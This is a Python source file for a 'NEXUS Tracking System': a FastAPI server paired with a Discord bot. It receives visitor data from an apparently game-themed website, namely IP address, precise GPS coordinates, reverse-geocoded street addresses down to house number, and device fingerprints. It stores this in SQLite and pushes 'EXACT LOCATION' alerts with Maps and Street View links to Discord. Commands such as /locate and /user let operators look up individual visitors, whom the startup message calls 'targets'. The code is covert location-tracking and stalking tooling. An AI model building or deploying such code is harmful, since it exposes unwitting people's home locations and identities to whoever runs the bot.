import os
import json
import asyncio
import threading
from datetime import datetime
from fastapi import FastAPI, Request
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import discord
from discord.ext import commands
from discord import app_commands, Embed, Color
import uvicorn
from pydantic import BaseModel
from dotenv import load_dotenv
import traceback
import sqlite3
import hashlib

load_dotenv()

# ==================== CONFIGURATION ====================
BOT_TOKEN = os.getenv('BOT_TOKEN')
DISCORD_CHANNEL_ID = int(os.getenv('DISCORD_CHANNEL_ID', '0'))
PORT = int(os.getenv('PORT', 8000))
FRONTEND_URL = "https://gamef-swart.vercel.app"

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set in .env")
    exit(1)
if not DISCORD_CHANNEL_ID:
    print("❌ DISCORD_CHANNEL_ID not set in .env")
    exit(1)

# ==================== DATA MODELS ====================
class VisitorInfo(BaseModel):
    # Basic info
    ip: str = "N/A"
    city: str = "N/A"
    region: str = "N/A"
    country: str = "N/A"
    timezone: str = "N/A"
    userAgent: str = "N/A"
    screen: dict = {}
    browser: dict = {}
    
    # Advanced location
    location: dict = {}
    address: dict = {}
    coordinates: dict = {}
    accuracy: float = 0
    source: str = "Unknown"
    
    # System
    system: dict = {}
    fragments: list = []
    button_presses: int = 0

# ==================== FASTAPI SETUP ====================
app = FastAPI(title="NEXUS Tracking System")

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=[FRONTEND_URL, "http://localhost:3000", "*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== DATABASE SETUP ====================
DB_PATH = '/tmp/nexus.db' if os.getenv('RENDER') else 'nexus.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, 
                  last_seen TIMESTAMP, visit_count INTEGER, username TEXT)''')
    
    # Locations table with full details
    c.execute('''CREATE TABLE IF NOT EXISTS locations
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
                  address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
                  neighbourhood TEXT, road TEXT, house_number TEXT, source TEXT, timestamp TIMESTAMP)''')
    
    # System fingerprints
    c.execute('''CREATE TABLE IF NOT EXISTS fingerprints
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
                  memory TEXT, screen TEXT, timezone TEXT, language TEXT, cookies BOOLEAN, timestamp TIMESTAMP)''')
    
    # Fragments
    c.execute('''CREATE TABLE IF NOT EXISTS fragments
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, fragment_number INTEGER, collected_at TIMESTAMP)''')
    
    # Button presses
    c.execute('''CREATE TABLE IF NOT EXISTS button_presses
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, press_count INTEGER, message TEXT, timestamp TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

# ==================== DISCORD BOT SETUP ====================
class NexusBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix='!', intents=intents)
        self.channel = None
        self.ready = False
    
    async def setup_hook(self):
        await self.tree.sync()  # Sync slash commands
        print("✅ Slash commands synced")

bot = NexusBot()

# ==================== SLASH COMMANDS ====================
@bot.tree.command(name="stats", description="Get tracking statistics")
async def stats(interaction: discord.Interaction):
    await interaction.response.defer()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(DISTINCT id) FROM users")
    total_users = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM locations")
    total_locations = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM fragments")
    total_fragments = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM button_presses")
    total_presses = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM users WHERE datetime(last_seen) > datetime('now', '-5 minutes')")
    online_now = c.fetchone()[0] or 0
    
    c.execute('''SELECT latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT 1''')
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(
        title="📊 NEXUS STATISTICS",
        color=Color.purple(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="Total Users", value=f"`{total_users}`", inline=True)
    embed.add_field(name="Online Now", value=f"`{online_now}`", inline=True)
    embed.add_field(name="Locations", value=f"`{total_locations}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{total_fragments}`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{total_presses}`", inline=True)
    
    if latest:
        location_text = latest[2] or latest[3] or f"{latest[0]:.4f}, {latest[1]:.4f}"
        time_ago = datetime.fromisoformat(latest[4]) if latest[4] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        embed.add_field(
            name=f"📍 Latest ({mins_ago}m ago)",
            value=f"```{location_text[:50]}```",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="recent", description="Show recent locations")
@app_commands.describe(limit="Number of locations to show (default: 5)")
async def recent(interaction: discord.Interaction, limit: int = 5):
    await interaction.response.defer()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
                 FROM locations ORDER BY timestamp DESC LIMIT ?''', (min(limit, 20),))
    locs = c.fetchall()
    conn.close()
    
    if not locs:
        await interaction.followup.send("No locations found")
        return
    
    embed = Embed(
        title=f"📍 RECENT LOCATIONS (Last {len(locs)})",
        color=Color.blue(),
        timestamp=datetime.now()
    )
    
    for loc in locs:
        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
        mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
        
        location_text = loc[3] or loc[4] or f"{loc[1]:.4f}, {loc[2]:.4f}"
        maps_url = f"https://www.google.com/maps?q={loc[1]},{loc[2]}"
        
        embed.add_field(
            name=f"User {loc[0][:8]} - {mins_ago}m ago",
            value=f"[{location_text[:75]}]({maps_url})",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="user", description="Get detailed info about a user")
@app_commands.describe(user_id="The user ID to look up")
async def user_info(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Get user info
    c.execute("SELECT ip, user_agent, first_seen, last_seen, visit_count FROM users WHERE id LIKE ?", (f'{user_id}%',))
    user = c.fetchone()
    
    if not user:
        await interaction.followup.send(f"User `{user_id}` not found")
        conn.close()
        return
    
    # Get location count
    c.execute("SELECT COUNT(*) FROM locations WHERE user_id LIKE ?", (f'{user_id}%',))
    loc_count = c.fetchone()[0]
    
    # Get fragments
    c.execute("SELECT COUNT(*) FROM fragments WHERE user_id LIKE ?", (f'{user_id}%',))
    frag_count = c.fetchone()[0]
    
    # Get button presses
    c.execute("SELECT SUM(press_count) FROM button_presses WHERE user_id LIKE ?", (f'{user_id}%',))
    press_count = c.fetchone()[0] or 0
    
    # Get latest location
    c.execute('''SELECT latitude, longitude, address, city, state, country, timestamp 
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
    latest = c.fetchone()
    
    conn.close()
    
    embed = Embed(
        title=f"👤 USER INFORMATION",
        color=Color.green(),
        timestamp=datetime.now()
    )
    
    embed.add_field(name="User ID", value=f"`{user_id[:16]}`", inline=False)
    embed.add_field(name="IP Address", value=f"`{user[0]}`", inline=True)
    embed.add_field(name="First Seen", value=f"`{user[2][:16]}`", inline=True)
    embed.add_field(name="Last Seen", value=f"`{user[3][:16]}`", inline=True)
    embed.add_field(name="Visits", value=f"`{user[4]}`", inline=True)
    embed.add_field(name="Locations", value=f"`{loc_count}`", inline=True)
    embed.add_field(name="Fragments", value=f"`{frag_count}/9`", inline=True)
    embed.add_field(name="Button Presses", value=f"`{press_count}`", inline=True)
    
    if latest:
        location_text = latest[2] or f"{latest[3]}, {latest[4]}" or f"{latest[0]:.4f}, {latest[1]:.4f}"
        maps_url = f"https://www.google.com/maps?q={latest[0]},{latest[1]}"
        embed.add_field(
            name="📍 Latest Location",
            value=f"[{location_text[:100]}]({maps_url})",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="fragments", description="Show fragment collection leaderboard")
async def fragment_leaderboard(interaction: discord.Interaction):
    await interaction.response.defer()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT user_id, COUNT(*) as count 
                 FROM fragments 
                 GROUP BY user_id 
                 ORDER BY count DESC 
                 LIMIT 10''')
    leaders = c.fetchall()
    conn.close()
    
    if not leaders:
        await interaction.followup.send("No fragments collected yet")
        return
    
    embed = Embed(
        title="🧩 FRAGMENT LEADERBOARD",
        color=Color.gold(),
        timestamp=datetime.now()
    )
    
    for i, (user_id, count) in enumerate(leaders, 1):
        medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else "📌"
        embed.add_field(
            name=f"{medal} User {user_id[:8]}",
            value=f"`{count}/9 fragments`",
            inline=False
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="locate", description="Get map link for latest location")
@app_commands.describe(user_id="The user ID to locate")
async def locate(interaction: discord.Interaction, user_id: str):
    await interaction.response.defer()
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''SELECT latitude, longitude, address, city 
                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
    loc = c.fetchone()
    conn.close()
    
    if not loc:
        await interaction.followup.send(f"No location found for user {user_id}")
        return
    
    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
    street_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}&layer=c"
    
    location_text = loc[2] or loc[3] or f"{loc[0]:.4f}, {loc[1]:.4f}"
    
    embed = Embed(
        title="📍 USER LOCATION",
        description=f"[{location_text}]({maps_url})",
        color=Color.red()
    )
    
    embed.add_field(name="Coordinates", value=f"`{loc[0]:.6f}, {loc[1]:.6f}`", inline=True)
    embed.add_field(name="Street View", value=f"[Click here]({street_url})", inline=True)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="alert", description="Send an alert to all users (admin only)")
@app_commands.describe(message="The alert message to send")
async def alert(interaction: discord.Interaction, message: str):
    # Check if user has admin permissions
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("You need administrator permissions to use this command", ephemeral=True)
        return
    
    embed = Embed(
        title="🚨 GLOBAL ALERT",
        description=f"```{message}```",
        color=Color.red(),
        timestamp=datetime.now()
    )
    
    await interaction.response.send_message(embed=embed)
    
    # This would require WebSocket connection to frontend
    # For now, just log it
    print(f"Alert sent: {message}")

@bot.tree.command(name="help", description="Show all available commands")
async def help_command(interaction: discord.Interaction):
    embed = Embed(
        title="🔮 NEXUS COMMANDS",
        description="Here are all available slash commands:",
        color=Color.purple()
    )
    
    commands = [
        "`/stats` - View tracking statistics",
        "`/recent [limit]` - Show recent locations",
        "`/user [user_id]` - Get user details",
        "`/locate [user_id]` - Get user's map location",
        "`/fragments` - View fragment leaderboard",
        "`/alert [message]` - Send global alert (admin only)",
        "`/help` - Show this message"
    ]
    
    embed.add_field(name="Commands", value="\n".join(commands), inline=False)
    embed.set_footer(text="NEXUS Tracking System v2.0")
    
    await interaction.response.send_message(embed=embed)

# ==================== DISCORD EVENTS ====================
@bot.event
async def on_ready():
    print(f'✅ Logged in as {bot.user}')
    print(f'📡 Bot ID: {bot.user.id}')
    
    try:
        # Get channel
        bot.channel = bot.get_channel(DISCORD_CHANNEL_ID)
        if not bot.channel:
            bot.channel = await bot.fetch_channel(DISCORD_CHANNEL_ID)
        
        bot.ready = True
        print(f'✅ Connected to channel: #{bot.channel.name}')
        
        # Send startup message
        embed = Embed(
            title="🔮 NEXUS SYSTEM ONLINE",
            description="```Tracking system activated\nWaiting for targets...```",
            color=Color.green(),
            timestamp=datetime.now()
        )
        embed.add_field(name="Status", value="✅ Active", inline=True)
        embed.add_field(name="Channel", value=f"#{bot.channel.name}", inline=True)
        embed.add_field(name="Commands", value="`/help` for all commands", inline=True)
        embed.add_field(name="Frontend", value=f"[Website]({FRONTEND_URL})", inline=True)
        
        await bot.channel.send(embed=embed)
        print("✅ Startup message sent")
        
    except Exception as e:
        print(f'❌ Error: {e}')

# ==================== FASTAPI ENDPOINTS ====================
@app.get("/")
async def root():
    return {
        "name": "NEXUS Tracking System",
        "status": "online",
        "bot_ready": bot.ready,
        "frontend": FRONTEND_URL,
        "commands": "/help for slash commands"
    }

@app.get("/api/health")
async def health():
    return {
        "status": "online",
        "bot_ready": bot.ready,
        "timestamp": datetime.now().isoformat()
    }

@app.post("/submit")
async def submit_visitor(request: Request, visitor: VisitorInfo):
    """Receive visitor data from frontend"""
    try:
        data = visitor.dict()
        client_ip = request.client.host
        
        print(f"📥 Received data from {client_ip}")
        
        # Generate user ID
        user_id = hashlib.sha256(f"{client_ip}_{data.get('userAgent', '')}".encode()).hexdigest()[:16]
        
        # Store in database
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        # Check if new user
        c.execute("SELECT COUNT(*) FROM users WHERE id = ?", (user_id,))
        is_new = c.fetchone()[0] == 0
        
        # Update user
        c.execute('''INSERT OR REPLACE INTO users (id, ip, user_agent, first_seen, last_seen, visit_count)
                     VALUES (?, ?, ?, 
                     COALESCE((SELECT first_seen FROM users WHERE id = ?), ?),
                     ?, 
                     COALESCE((SELECT visit_count FROM users WHERE id = ?), 0) + 1)''',
                  (user_id, client_ip, data.get('userAgent', ''), user_id, datetime.now(), datetime.now(), user_id))
        
        # Store location if available
        if data.get('coordinates'):
            coords = data.get('coordinates', {})
            loc_data = data.get('location', {})
            addr = data.get('address', {})
            
            c.execute('''INSERT INTO locations 
                        (user_id, latitude, longitude, accuracy, address, city, county, state, 
                         zip, country, neighbourhood, road, house_number, source, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, 
                      coords.get('lat'),
                      coords.get('lon'),
                      data.get('accuracy', 1000),
                      loc_data.get('display_name'),
                      addr.get('city') or addr.get('town'),
                      addr.get('county'),
                      addr.get('state'),
                      addr.get('postcode'),
                      addr.get('country'),
                      addr.get('neighbourhood') or addr.get('suburb'),
                      addr.get('road'),
                      addr.get('house_number'),
                      data.get('source', 'GPS'),
                      datetime.now()))
        
        # Store system info
        if data.get('system'):
            sys = data.get('system', {})
            c.execute('''INSERT INTO fingerprints 
                        (user_id, platform, browser, cores, memory, screen, timezone, language, cookies, timestamp)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                     (user_id, 
                      sys.get('platform'),
                      sys.get('userAgent'),
                      sys.get('cores'),
                      sys.get('memory'),
                      f"{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}",
                      data.get('timezone'),
                      sys.get('browser', {}).get('language'),
                      sys.get('browser', {}).get('cookies'),
                      datetime.now()))
        
        conn.commit()
        conn.close()
        
        # Send to Discord if bot is ready
        if bot.ready and bot.channel:
            await send_to_discord(user_id, data, client_ip, is_new)
        
        return JSONResponse({"status": "success", "user_id": user_id, "is_new": is_new})
        
    except Exception as e:
        print(f"❌ Error: {e}")
        traceback.print_exc()
        return JSONResponse({"error": str(e)}, status_code=500)

async def send_to_discord(user_id: str, data: dict, ip: str, is_new: bool):
    """Send formatted data to Discord"""
    try:
        # New visitor alert
        if is_new:
            embed = Embed(
                title="🎯 NEW VISITOR",
                color=Color.purple(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="Location", value=f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')}", inline=True)
            
            await bot.channel.send(embed=embed)
        
        # Location data
        if data.get('coordinates'):
            coords = data.get('coordinates', {})
            addr = data.get('address', {})
            loc = data.get('location', {})
            
            embed = Embed(
                title="📍 EXACT LOCATION",
                color=Color.red(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="Accuracy", value=f"`{data.get('accuracy', '?')}m`", inline=True)
            
            # Coordinates
            embed.add_field(
                name="Coordinates",
                value=f"```\nLat: {coords.get('lat', '?')}\nLon: {coords.get('lon', '?')}```",
                inline=False
            )
            
            # Full address
            if loc.get('display_name'):
                embed.add_field(
                    name="Address",
                    value=f"```{loc.get('display_name')[:100]}```",
                    inline=False
                )
            
            # Details
            details = []
            if addr.get('house_number'): details.append(f"🏠 House: {addr.get('house_number')}")
            if addr.get('road'): details.append(f"🛣️ Road: {addr.get('road')}")
            if addr.get('city') or addr.get('town'): details.append(f"🏙️ City: {addr.get('city') or addr.get('town')}")
            if addr.get('state'): details.append(f"📍 State: {addr.get('state')}")
            if addr.get('country'): details.append(f"🌍 Country: {addr.get('country')}")
            if addr.get('postcode'): details.append(f"📮 ZIP: {addr.get('postcode')}")
            
            if details:
                embed.add_field(name="Details", value="\n".join(details), inline=False)
            
            # Maps links
            maps_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}"
            street_url = f"https://www.google.com/maps?q={coords.get('lat')},{coords.get('lon')}&layer=c"
            
            embed.add_field(name="🗺️ Maps", value=f"[Open]({maps_url})", inline=True)
            embed.add_field(name="📸 Street", value=f"[View]({street_url})", inline=True)
            
            await bot.channel.send(embed=embed)
        
        # System data
        if data.get('system'):
            sys = data.get('system', {})
            
            embed = Embed(
                title="💻 SYSTEM INFO",
                color=Color.blue(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Platform", value=f"`{sys.get('platform', '?')}`", inline=True)
            embed.add_field(name="Cores", value=f"`{sys.get('cores', '?')}`", inline=True)
            embed.add_field(name="Memory", value=f"`{sys.get('memory', '?')}`", inline=True)
            embed.add_field(name="Screen", value=f"`{sys.get('screen', {}).get('width')}x{sys.get('screen', {}).get('height')}`", inline=True)
            embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
            
            await bot.channel.send(embed=embed)
        
        # Button press
        if data.get('button_presses', 0) > 0:
            presses = data.get('button_presses', 0)
            
            embed = Embed(
                title="🚫 BUTTON PRESSED",
                color=Color.dark_red(),
                timestamp=datetime.now()
            )
            
            embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
            embed.add_field(name="Presses", value=f"`{presses}`", inline=True)
            
            await bot.channel.send(embed=embed)
        
        # Fragments
        if data.get('fragments'):
            for fragment in data.get('fragments', []):
                embed = Embed(
                    title="🧩 FRAGMENT FOUND",
                    color=Color.green(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="User ID", value=f"`{user_id[:8]}`", inline=True)
                embed.add_field(name="Fragment", value=f"`{fragment}/9`", inline=True)
                
                await bot.channel.send(embed=embed)
                
    except Exception as e:
        print(f"❌ Discord send error: {e}")

# ==================== STARTUP ====================
async def run_bot():
    try:
        await bot.start(BOT_TOKEN)
    except Exception as e:
        print(f"❌ Bot error: {e}")

def start_bot_thread():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(run_bot())

@app.on_event("startup")
async def startup_event():
    """Start Discord bot"""
    thread = threading.Thread(target=start_bot_thread, daemon=True)
    thread.start()
    print("✅ Discord bot thread started")

# ==================== RUN ====================
if __name__ == "__main__":
    print("=" * 50)
    print("🔮 NEXUS TRACKING SYSTEM")
    print("=" * 50)
    print(f"📡 Bot Token: {BOT_TOKEN[:10]}..." if BOT_TOKEN else "❌ No token")
    print(f"📡 Channel ID: {DISCORD_CHANNEL_ID}")
    print(f"🌐 Frontend: {FRONTEND_URL}")
    print(f"💻 Slash Commands: /help")
    print("=" * 50)
    
    uvicorn.run(app, host="0.0.0.0", port=PORT)
